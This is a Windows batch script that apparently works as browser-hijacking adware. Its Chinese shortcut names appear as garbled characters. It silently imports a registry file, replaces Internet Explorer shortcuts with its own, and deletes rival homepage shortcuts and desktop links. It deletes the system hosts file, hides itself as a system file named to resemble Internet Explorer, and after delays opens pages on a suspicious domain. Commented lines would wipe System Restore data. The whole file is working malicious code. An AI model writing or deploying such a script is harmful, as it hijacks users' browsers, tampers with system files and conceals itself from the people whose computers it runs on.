@shift
@echo off


regedit /s key.reg



copy "Internet Explore.lnk" "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\���� Internet Explorer �����.lnk" /Y

copy "Internet Explore.lnk" "C:\Documents and Settings\Administrator\Application Data\Microsoft\Internet Explorer\Quick Launch\���� Internet Explorer �����.lnk" /Y

copy "Internet Explore.lnk" "%USERPROFILE%\����ʼ���˵�\Internet Explore.lnk" /Y

copy "Internet Explore.lnk" "%USERPROFILE%\����ʼ���˵�\����\Internet Explore.lnk" /Y

del "%USERPROFILE%\����\��ַ��ȫ.lnk"

del "%ALLUSERSPROFILE%\����\��ַ��ȫ.lnk"

del "C:\Documents and Settings\Administrator\����\��ַ��ȫ.lnk"

del "%USERPROFILE%\����\365����ַ.lnk"

del "%USERPROFILE%\����\�������Ӱ��չ��.lnk"

del "%USERPROFILE%\����\i��Ӱ��.lnk"

del "%USERPROFILE%\����\��Ѹ����Ӱ.lnk"

del "%USERPROFILE%\����\2345��ַ����(IE).lnk"

del "%ALLUSERSPROFILE%\����\�ܿ���Ƶ����.lnk"

del "%USERPROFILE%\����\Internet Explorer.lnk"

del "C:\Documents and Settings\Administrator\����\365����ַ.lnk"

del "%USERPROFILE%\����\�˽���ַ��ȫ.lnk"

del "C:\Documents and Settings\Administrator\����\�˽���ַ��ȫ.lnk"

del "%USERPROFILE%\����\IEXPLORE.EXE.lnk"

del "%USERPROFILE%\����\IEXPLORE.lnk"

del "%USERPROFILE%\����\Internet Explore.lnk"

del "C:\Documents and Settings\Administrator\����\IEXPLORE.lnk"

del "C:\Documents and Settings\Administrator\����\Internet Explorer.lnk"

del "%USERPROFILE%\����\*.url"

del "C:\Documents and Settings\Administrator\����\*.url"

del key.reg

::ɾ��host�ļ�
del %windir%\system32\drivers\etc\hosts

ATTRIB +H +R +S +A c:\iexplor.bat


::ˢ�£��ӷ���
msiexec /regserver

::ATTRIB -H -R -S -A c:\GRLDR

::del c:\GRLDR /S /Q

::del C:\WINDOWS\system32\Restore /S /Q

ping 127.0.0.1 /n 3600 >nul

start explorer http://hao123163qqbaidu.qingchun-meinv.cn/news/news1.html

ping 127.0.0.1 /n 4000 >nul

start explorer http://hao123163qqbaidu.qingchun-meinv.cn/news/news2.html

ping 127.0.0.1 /n 4600 >nul

start explorer http://hao123163qqbaidu.qingchun-meinv.cn/news/news3.html

exit


